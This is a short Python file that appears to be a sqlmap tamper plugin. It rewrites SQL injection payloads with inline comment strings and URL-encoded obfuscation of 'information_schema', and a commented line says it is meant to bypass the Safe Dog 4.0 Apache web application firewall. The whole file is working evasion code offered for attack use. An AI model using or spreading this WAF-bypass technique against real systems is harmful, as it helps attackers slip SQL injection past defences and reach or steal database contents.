#!/usr/bin/env python

from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.LOWEST

def dependencies():
	pass

def tamper(payload, **kwargs):

	if payload:
		bypass_SafeDog_str = "/*x^x*/"
		payload=payload.replace("UNION",bypass_SafeDog_str+"UNION"+bypass_SafeDog_str)
		payload=payload.replace("SELECT",bypass_SafeDog_str+"SELECT"+bypass_SafeDog_str)
		payload=payload.replace("AND",bypass_SafeDog_str+"AND"+bypass_SafeDog_str)
		payload=payload.replace("=",bypass_SafeDog_str+"="+bypass_SafeDog_str)
		payload=payload.replace(" ",bypass_SafeDog_str)
		payload=payload.replace("information_schema.","%20%20/*!%20%20%20%20INFOrMATION_SCHEMa%20%20%20%20*/%20%20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/")
		payload=payload.replace("FROM",bypass_SafeDog_str+"FROM"+bypass_SafeDog_str)
		#print "[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version ."
		# print payload
	return payload